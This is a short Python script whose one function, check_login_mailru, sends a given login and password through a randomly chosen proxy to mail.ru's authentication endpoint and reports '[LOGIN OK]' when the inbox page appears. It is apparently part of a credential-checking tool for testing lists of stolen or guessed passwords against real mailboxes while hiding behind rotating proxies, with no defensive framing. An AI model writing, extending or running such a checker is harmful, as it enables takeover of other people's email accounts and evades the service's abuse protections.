#!/usr/bin/python3
# encoding=utf-8
import web_api, random

import json, requests, psycopg2
import re,sys,string,shutil,subprocess

def check_login_mailru(login,domain,password,rproxy=web_api.get_random_proxy()):
	status='[CONNECTION ERROR]'
	proxies = {
		"http": "http://"+rproxy[0]+":"+rproxy[1],
		"https": "http://"+rproxy[0]+":"+rproxy[1],
		}
	Rstatus=True
	try:
		page_=requests.get('https://m.mail.ru/login',proxies=proxies,timeout=60)
	except:
		Rstatus=False
	if Rstatus:
		cookie=page_.cookies
		payload = {'post':'','mhost':'m.mail.ru','login_from':'','Login':login,'Domain':domain,'Password':password}
		try:
			page_ = requests.post("https://auth.mail.ru/cgi-bin/auth?rand=9763"+str(random.choice(range(1000,10000))), data=payload ,cookies=cookie,proxies=proxies,timeout=60)
		except:
			Rstatus=False
		if Rstatus:
			status='[LOGIN ERROR]'
			if page_.text.count('https://m.mail.ru/messages/inbox/')>0:
				status='[LOGIN OK]'
	return status
